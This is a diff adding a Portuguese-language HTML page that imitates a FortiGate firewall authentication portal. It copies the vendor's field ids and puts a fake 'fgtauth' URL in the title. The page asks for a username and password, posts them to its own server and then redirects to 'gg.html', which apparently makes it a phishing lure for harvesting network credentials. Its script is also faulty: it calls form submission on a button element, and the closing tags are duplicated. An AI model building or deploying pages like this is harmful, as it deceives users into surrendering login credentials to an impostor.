@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="stylesheet" href="src/css/style.css">
+	<title>http://10.114.2.1:1000/fgtauth?06081e99e74b4148</title>
+</head>
+<body>
+	<div class="message-container">
+		<div class="logo"></div>
+		<h1>Autenticação Necessária </h1>
+		<form action="/" method="post">
+			<p>Utilize suas credenciais de acesso </p>
+			<div class="field">
+				<label for="ft_un">Usuario </label>
+				<div>
+					<input name="username" id="ft_un" type="text" autocorrect="off" autocapitalize="off">
+				</div>
+			</div>
+			<div class="field">
+				<label for="ft_pd">Senha </label>
+				<div>
+					<input name="password" id="ft_pd" type="password" >
+				</div>
+			</div>
+			<div class="form-footer">
+				<button id="authForm" class="primary btn" type="button" onclick="submitForm()">Continue</button>
+			</div>
+		</form>
+
+	</div>
+	<script>
+		function submitForm() {
+			// Obter o formulário pelo ID
+			const form = document.getElementById('authForm');
+			console.log('Form encontrado:', form);
+	
+			// Verificar se o formulário foi encontrado
+			if (form) {
+				// Submeter o formulário usando o método nativo
+				try {
+					HTMLFormElement.prototype.submit.call(form);
+					console.log('Formulário submetido com sucesso.');
+				} catch (e) {
+					console.error('Erro ao submeter o formulário:', e);
+				}
+	
+				// Redirecionar para a página desejada
+				window.location.href = 'gg.html';
+			} else {
+				console.error('Formulário não encontrado.');
+			}
+		}
+	</script>
+</body>
+</html>
+
+</body>
+</html>
